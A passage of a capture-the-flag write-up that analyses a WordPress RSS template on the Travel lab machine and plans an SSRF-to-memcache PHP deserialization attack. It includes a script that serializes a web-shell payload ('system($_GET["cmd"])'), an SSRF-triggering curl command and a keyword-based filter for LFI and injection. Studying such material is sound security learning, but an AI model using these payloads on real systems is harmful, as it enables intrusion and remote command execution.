+<span class="p">*</span> create page in backend and choose rss_template.php as theme
+
+<span class="gu">## Changelog</span>
+<span class="p">
+-</span> temporarily disabled cache compression
+<span class="p">-</span> added additional security checks 
+<span class="p">-</span> added caching
+<span class="p">-</span> added rss template
+
+<span class="gu">## ToDo</span>
+<span class="p">
+-</span> finish logging implementation
+</code></pre></div></div>
+<h4 id="rss_templatephp">rss_template.php</h4>
+<p><code class="language-plaintext highlighter-rouge">rss_template.php</code> creates the <code class="language-plaintext highlighter-rouge">http://blog.travel.htb/awesome-rss/</code> page that I found earlier. I’ll include the <a href="#full-php-code">full source at the end</a>, and just stick to the interesting bits here.</p>
+<p>There’s a function <code class="language-plaintext highlighter-rouge">get_feed($url)</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">get_feed</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
+    <span class="k">require_once</span> <span class="no">ABSPATH</span> <span class="mf">.</span> <span class="s1">'/wp-includes/class-simplepie.php'</span><span class="p">;</span>
+    <span class="nv">$simplepie</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nf">url_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$simplepie</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SimplePie</span><span class="p">();</span>
+        <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">set_cache_location</span><span class="p">(</span><span class="s1">'memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_'</span><span class="p">);</span>
+        <span class="c1">//$simplepie-&gt;set_raw_data($data);</span>
+        <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">set_feed_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+        <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">();</span>
+        <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">handle_content_type</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nb">error_log</span><span class="p">(</span><span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="n">error</span><span class="p">);</span>
+            <span class="nv">$simplepie</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+            <span class="nv">$failed</span> <span class="o">=</span> <span class="kc">True</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$failed</span> <span class="o">=</span> <span class="kc">True</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$simplepie</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>It’s using <a href="https://github.com/simplepie/simplepie/">SimplePie</a>, which is now the built in way to do RSS in WordPress. I can see that it’s using <code class="language-plaintext highlighter-rouge">memcache</code> for caching, with a timeout of 60 (seconds) and a prefix of <code class="language-plaintext highlighter-rouge">xct_</code>.</p>
+<p><code class="language-plaintext highlighter-rouge">get_feed</code> is called just after a <code class="language-plaintext highlighter-rouge">$url</code> variable is set:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">];</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s2">"custom_feed_url"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span>
+    <span class="nv">$tmp</span> <span class="o">=</span> <span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">"="</span><span class="p">,</span> <span class="nv">$url</span><span class="p">));</span>
+    <span class="nv">$url</span> <span class="o">=</span> <span class="nb">end</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$url</span> <span class="o">=</span> <span class="s2">"http://www.travel.htb/newsfeed/customfeed.xml"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$feed</span> <span class="o">=</span> <span class="nf">get_feed</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">$_SERVER['QUERY_STRING']</code> is everything after the <code class="language-plaintext highlighter-rouge">?</code> in a GET request. So if <code class="language-plaintext highlighter-rouge">custom_feed_url</code> is not in the query string, it sets <code class="language-plaintext highlighter-rouge">$url</code> to a static <code class="language-plaintext highlighter-rouge">.xml</code> file on <code class="language-plaintext highlighter-rouge">www.travel.htb</code>. I can check it out, and it matches what I see in AwesomeRss:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200520154823648.webp" type="image/webp"/>
+<img alt="image-20200520154823648" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200520154823648.png"/>
+</picture>
+<p>If <code class="language-plaintext highlighter-rouge">custom_feed_url</code> is in the query string, then it calls <code class="language-plaintext highlighter-rouge">explode</code> on the query string, which <a href="https://www.php.net/manual/en/function.explode.php">in PHP</a> will split the string by another string, in this case, by <code class="language-plaintext highlighter-rouge">=</code>, and then it takes the last element.</p>
+<p>So to control <code class="language-plaintext highlighter-rouge">$url</code> , I just need to send <code class="language-plaintext highlighter-rouge">?custom_feed_url&amp;url=[url]</code>.</p>
+<p>I can test this by trying to grab something from myself. With an HTTP server running, I’ll use <code class="language-plaintext highlighter-rouge">curl</code> to trigger it:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s1">'http://blog.travel.htb/awesome-rss/?custom_feed_url&amp;url=http://10.10.14.47/feed'</span> <span class="o">&gt;</span> /dev/null
+</code></pre></div></div>
+<p>And I see the hit on my server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 80
+<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.189 - - [20/May/2020 16:21:31] code 404, message File not found
+10.10.10.189 - - [20/May/2020 16:21:31] "GET /feed HTTP/1.1" 404 -
+10.10.10.189 - - [20/May/2020 16:21:31] code 404, message File not found
+10.10.10.189 - - [20/May/2020 16:21:31] "GET /feed HTTP/1.1" 404 -
+</span></code></pre></div></div>
+<p>Finally, at the bottom, there’s an option to include <code class="language-plaintext highlighter-rouge">debug.php</code> inside HTML comments:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--
+DEBUG
+</span><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">])){</span>
+  <span class="k">include</span><span class="p">(</span><span class="s1">'debug.php'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="c">
+--&gt;</span>
+</code></pre></div></div>
+<p>I immediately went to <code class="language-plaintext highlighter-rouge">http://blog.travel.htb/auesome-rss/?debug</code>. On my first loading, there was only an empty bit:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200520160537544.webp" type="image/webp"/>
+<img alt="image-20200520160537544" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200520160537544.png"/>
+</picture>
+<p>On refreshing, there was something cached:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200520160153746.webp" type="image/webp"/>
+<img alt="image-20200520160153746" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200520160153746.png"/>
+</picture>
+<p>What is particularly interesting is that the cached object looks like a PHP serialized object.</p>
+<h4 id="templatephp">template.php</h4>
+<p><code class="language-plaintext highlighter-rouge">template.php</code> has two parts. First, it has <code class="language-plaintext highlighter-rouge">url_get_contents($url)</code>, which is called from <code class="language-plaintext highlighter-rouge">get_feed</code> in <code class="language-plaintext highlighter-rouge">rss_template.php</code>. This function calls <code class="language-plaintext highlighter-rouge">safe</code> and <code class="language-plaintext highlighter-rouge">escapeshellargs</code> on the url, and then builds a string by appending it to <code class="language-plaintext highlighter-rouge">curl</code>, and passes it to <code class="language-plaintext highlighter-rouge">shell_exec</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">url_get_contents</span> <span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$url</span> <span class="o">=</span> <span class="nf">safe</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+        <span class="nv">$url</span> <span class="o">=</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+        <span class="nv">$pl</span> <span class="o">=</span> <span class="s2">"curl "</span><span class="mf">.</span><span class="nv">$url</span><span class="p">;</span>
+        <span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$pl</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">safe</code> doesn’t change the url, but has three checks, each which check the decoded url for two strings:</p>
+<ul>
+<li>LFI: <code class="language-plaintext highlighter-rouge">file://</code> or <code class="language-plaintext highlighter-rouge">@</code></li>
+<li>Command injection: <code class="language-plaintext highlighter-rouge">-o</code> or <code class="language-plaintext highlighter-rouge">-F</code></li>
+<li>SSRF: <code class="language-plaintext highlighter-rouge">localhost</code> or <code class="language-plaintext highlighter-rouge">127.0.0.1</code></li>
+</ul>
+<p>If any of these match in <code class="language-plaintext highlighter-rouge">$url</code>, PHP calls <code class="language-plaintext highlighter-rouge">die</code> and exits:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">safe</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
+<span class="p">{</span>
+        <span class="c1">// this should be secure</span>
+        <span class="nv">$tmpUrl</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"file://"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="k">or</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"@"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span>
+        <span class="p">{</span>               
+                <span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (LFI). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"-o"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="k">or</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"-F"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span>
+        <span class="p">{</span>               
+                <span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (Command Injection). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="kc">PHP_URL_HOST</span><span class="p">);</span>
+        <span class="c1">// preventing all localhost access</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$tmp</span> <span class="o">==</span> <span class="s2">"localhost"</span> <span class="k">or</span> <span class="nv">$tmp</span> <span class="o">==</span> <span class="s2">"127.0.0.1"</span><span class="p">)</span>
+        <span class="p">{</span>               
+                <span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>              
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$url</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The second part of this file is a class, <code class="language-plaintext highlighter-rouge">TemplateHelper</code>, which isn’t referenced anywhere else in the code. There’s a comment at the top of the file that indicates it’s not done (which echo’s what was in <code class="language-plaintext highlighter-rouge">README.md</code>):</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cd">/**
+ Todo: finish logging implementation via TemplateHelper
+*/</span>
+</code></pre></div></div>
+<p>The class itself isn’t that interesting, other than it writes a file on creation of a new object or on <code class="language-plaintext highlighter-rouge">__wakeup</code>, which is a <a href="https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup">PHP Magic Method</a> designed to reestablish any database connections lost during serialization and deserialization.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">TemplateHelper</span>
+<span class="p">{</span>
+
+    <span class="k">private</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">function</span> <span class="n">init</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>           
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span><span class="mf">.</span><span class="s1">'/logs/'</span><span class="mf">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<h2 id="shell-as-www-datablog">Shell as www-data@blog</h2>
+<h3 id="idea">Idea</h3>
+<p>It seems clear that SimplePie is serializing PHP objects, and caching that data in memcache for 60 seconds. If I can drop my own payload into memcache, when SimplePie goes to deserialize it, I can perform an attack there. The fact that I’m given this <code class="language-plaintext highlighter-rouge">TemplateHelper</code> class is a good hint that this is a place to look, since it has the <code class="language-plaintext highlighter-rouge">__wakeup</code> Magic Method. If I put this into my serialized object, when it is deserialized, the <code class="language-plaintext highlighter-rouge">__wakeup</code> method is called, which in this case will write data I set to a filename I set.</p>
+<p>To pull this off, I need:</p>
+<ul>
+<li><strong>To understand the naming convention used for a given feed</strong>. I can see the start of the name in the debug data, but not the entire thing. I need to know here the data will be so I can trigger it.</li>
+<li><strong>A way to use SSRF to write to memcache</strong>. Initially I was looking for a way to get an already serialized object into memcache through SimplePie, but I couldn’t find anything. But then I figured out how to do it with a SSRF to memcache.</li>
+<li><strong>Bypass for the “Hacker” Checks, specifically the SSRF check</strong>. In order for the previous step to work, I need to bypass the checks in <code class="language-plaintext highlighter-rouge">template.php</code>.</li>
+<li><strong>Serialized Payload to write a webshell</strong>.</li>
+</ul>
+<h3 id="php-payload">PHP Payload</h3>
+<p>Serialization is when a language (PHP, Python, Ruby, etc) takes an object and puts it into a string form, so that it can be passed somewhere, and then deserialized back to the object. The serialized object does not include the class definitions, just the attributes. Ippsec did a couple of <a href="https://www.youtube.com/watch?v=HaW15aMzBUM">really good videos</a> on PHP deserialization attacks which I’d recommend if you want to understand further.</p>
+<p>Just above I noticed that there was a class, <code class="language-plaintext highlighter-rouge">TemplateHelper</code> available for use on the server, even though the server never references it. It also has a <code class="language-plaintext highlighter-rouge">__wakeup()</code> method that will run on deserialization. So if I can have PHP on Travel deserialize a <code class="language-plaintext highlighter-rouge">TemplateHelper</code> object with <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">data</code> objects I set, it will write <code class="language-plaintext highlighter-rouge">data</code> to <code class="language-plaintext highlighter-rouge">file</code>.</p>
+<p>I wrote a simple PHP script to create this:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="kd">class</span> <span class="nc">TemplateHelper</span>
+<span class="p">{</span>
+
+    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$data</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span> <span class="o">=</span> <span class="s1">'0xdf.php'</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="s1">'&lt;?php system($_GET["cmd"]); ?&gt;'</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TemplateHelper</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>Note: It’s not immediately clear to me why I declare <code class="language-plaintext highlighter-rouge">$file</code> and <code class="language-plaintext highlighter-rouge">$data</code> as <code class="language-plaintext highlighter-rouge">public</code> when they are private in <code class="language-plaintext highlighter-rouge">TemplateHelper</code>. I got stuck here a while, and for some reason making this change actually allowed it to work.</p>
+<p>When I run that, it prints the serialized payload:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>php attack.php 
+<span class="go">O:14:"TemplateHelper":2:{s:4:"file";s:8:"0xdf.php";s:4:"data";s:30:"&lt;?php system($_GET["cmd"]); ?&gt;";}
+</span></code></pre></div></div>
+<h3 id="memcache-names">memcache Names</h3>
+<h4 id="simplepie-source">SimplePie Source</h4>
+<p>When I ran the debug by itself, I got back that the object starts with <code class="language-plaintext highlighter-rouge">xct_4e5612ba07...</code>. The beginning makes sense, since the PHP code sets up the cache with <code class="language-plaintext highlighter-rouge">prefix=xct_</code>. I did some basic guessing that maybe the rest was different kinds of hashes of the url, but none of them matched the part I could see.</p>
+<p>It was time to dig into the source. I need to see what happens when this section of code is executed:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$simplepie</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SimplePie</span><span class="p">();</span>
+<span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">set_cache_location</span><span class="p">(</span><span class="s1">'memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_'</span><span class="p">);</span>
+<span class="c1">//$simplepie-&gt;set_raw_data($data);</span>
+<span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">set_feed_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+<span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">();</span>
+</code></pre></div></div>
+<p>The base code for this class <a href="https://github.com/WordPress/WordPress/blob/master/wp-includes/class-simplepie.php">is here</a>. The first line is the creation of a <code class="language-plaintext highlighter-rouge">SimplePie</code> object. The <code class="language-plaintext highlighter-rouge">__construct()</code> <a href="https://github.com/WordPress/WordPress/blob/ba03c426db5a929907ac37de9c34f307114be6d9/wp-includes/class-simplepie.php#L701">function</a> creates a couple helper objects, and then, with no args passed in, exits.</p>
+<p>The next line is equally simple, as <a href="https://github.com/WordPress/WordPress/blob/ba03c426db5a929907ac37de9c34f307114be6d9/wp-includes/class-simplepie.php#L941">it sets</a> <code class="language-plaintext highlighter-rouge">$this-&gt;cache_location</code> to the given location.</p>
+<p>Skipping the commented line (which I can show doesn’t really matter anyway in <a href="#rss-exploration">Beyond Root</a>), next, <code class="language-plaintext highlighter-rouge">set_feed_url</code> <a href="https://github.com/WordPress/WordPress/blob/ba03c426db5a929907ac37de9c34f307114be6d9/wp-includes/class-simplepie.php#L794">basically does the same thing</a>, with some checks to see if the argument is a string or an array, and a call to make sure that the protocol is on there, attaching <code class="language-plaintext highlighter-rouge">http://</code> to the front if not.</p>
+<p>Then it calls <code class="language-plaintext highlighter-rouge">init()</code>, which <a href="https://github.com/WordPress/WordPress/blob/ba03c426db5a929907ac37de9c34f307114be6d9/wp-includes/class-simplepie.php#L1333">starts on line 1333 of the source</a>. There’s a bunch of checks, loading data from the url, and eventually it comes to <a href="https://github.com/WordPress/WordPress/blob/ba03c426db5a929907ac37de9c34f307114be6d9/wp-includes/class-simplepie.php#L1412">line 1412</a>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cache</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">registry</span><span class="o">-&gt;</span><span class="nf">call</span><span class="p">(</span><span class="s1">'Cache'</span><span class="p">,</span> <span class="s1">'get_handler'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache_location</span><span class="p">,</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache_name_function</span><span class="p">,</span> <span class="nv">$url</span><span class="p">),</span> <span class="s1">'spc'</span><span class="p">));</span>
+</code></pre></div></div>
+<p>There’s a lot going on in this line. To simplify:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">$this-&gt;cache_location</code> = <code class="language-plaintext highlighter-rouge">'memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_'</code> from being set by <code class="language-plaintext highlighter-rouge">$this-&gt;set_cache_location</code> above.</li>
+<li><code class="language-plaintext highlighter-rouge">$this-&gt;cache_name_function</code> is set on <a href="https://github.com/WordPress/WordPress/blob/ba03c426db5a929907ac37de9c34f307114be6d9/wp-includes/class-simplepie.php#L575">line 575</a> to a default value of <code class="language-plaintext highlighter-rouge">'md5'</code>, and it hasn’t been modified.</li>
+<li><code class="language-plaintext highlighter-rouge">$url</code> is the value passed in as the url.</li>
+</ul>
+<p>So this line is using the <code class="language-plaintext highlighter-rouge">call</code> function to call <code class="language-plaintext highlighter-rouge">get_handler($this-&gt;cache_location, md5($url), 'spc')</code> from <code class="language-plaintext highlighter-rouge">Cache.php</code>, which is <a href="https://github.com/WordPress/WordPress/blob/a72e30d84715fcea4dfa8594d2a650c364814531/wp-includes/SimplePie/Cache.php#L83">on GitHub</a>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="n">get_handler</span><span class="p">(</span><span class="nv">$location</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$extension</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$type</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">':'</span><span class="p">,</span> <span class="nv">$location</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+    <span class="nv">$type</span> <span class="o">=</span> <span class="nv">$type</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="k">self</span><span class="o">::</span><span class="nv">$handlers</span><span class="p">[</span><span class="nv">$type</span><span class="p">]))</span>
+    <span class="p">{</span>
+        <span class="nv">$class</span> <span class="o">=</span> <span class="k">self</span><span class="o">::</span><span class="nv">$handlers</span><span class="p">[</span><span class="nv">$type</span><span class="p">];</span>
+        <span class="k">return</span> <span class="k">new</span> <span class="nv">$class</span><span class="p">(</span><span class="nv">$location</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$extension</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="k">new</span> <span class="nc">SimplePie_Cache_File</span><span class="p">(</span><span class="nv">$location</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$extension</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The first thing this does is take the location, break it on <code class="language-plaintext highlighter-rouge">:</code>, and take the first result. That will be <code class="language-plaintext highlighter-rouge">memcache</code>, which is stored as <code class="language-plaintext highlighter-rouge">$type</code>. Earlier in the file, <code class="language-plaintext highlighter-rouge">$handlers</code> is defined:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">protected</span> <span class="k">static</span> <span class="nv">$handlers</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+    <span class="s1">'mysql'</span>     <span class="o">=&gt;</span> <span class="s1">'SimplePie_Cache_MySQL'</span><span class="p">,</span>
+    <span class="s1">'memcache'</span>  <span class="o">=&gt;</span> <span class="s1">'SimplePie_Cache_Memcache'</span><span class="p">,</span>
+    <span class="s1">'memcached'</span> <span class="o">=&gt;</span> <span class="s1">'SimplePie_Cache_Memcached'</span><span class="p">,</span>
+    <span class="s1">'redis'</span>     <span class="o">=&gt;</span> <span class="s1">'SimplePie_Cache_Redis'</span>
+<span class="p">);</span>
+</code></pre></div></div>
+<p>So it’s going to create a new <code class="language-plaintext highlighter-rouge">SimplePie_Cache_Memcache</code> object, and the constructor is called as:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">return</span> <span class="k">new</span> <span class="nv">$class</span><span class="p">(</span><span class="s1">'memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_'</span><span class="p">,</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$url</span><span class="p">),</span> <span class="s1">'spc'</span><span class="p">);</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">Memcache.php</code> defines the constructor <a href="https://github.com/WordPress/WordPress/blob/23c4fbeaa0458f634eee6e6529bc9aaaa4257ec2/wp-includes/SimplePie/Cache/Memcached.php#L84">on GitHub</a>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$location</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$type</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+        <span class="s1">'host'</span>   <span class="o">=&gt;</span> <span class="s1">'127.0.0.1'</span><span class="p">,</span>
+        <span class="s1">'port'</span>   <span class="o">=&gt;</span> <span class="mi">11211</span><span class="p">,</span>
+        <span class="s1">'extras'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
+            <span class="s1">'timeout'</span> <span class="o">=&gt;</span> <span class="mi">3600</span><span class="p">,</span> <span class="c1">// one hour</span>
+            <span class="s1">'prefix'</span>  <span class="o">=&gt;</span> <span class="s1">'simplepie_'</span><span class="p">,</span>
+        <span class="p">),</span>
+    <span class="p">);</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span> <span class="o">=</span> <span class="n">SimplePie_Misc</span><span class="o">::</span><span class="nb">array_merge_recursive</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">,</span> <span class="n">SimplePie_Cache</span><span class="o">::</span><span class="nb">parse_URL</span><span class="p">(</span><span class="nv">$location</span><span class="p">));</span>
+
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s1">'extras'</span><span class="p">][</span><span class="s1">'prefix'</span><span class="p">]</span> <span class="mf">.</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"</span><span class="nv">$name</span><span class="s2">:</span><span class="nv">$type</span><span class="s2">"</span><span class="p">);</span>
+
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Memcached</span><span class="p">();</span>
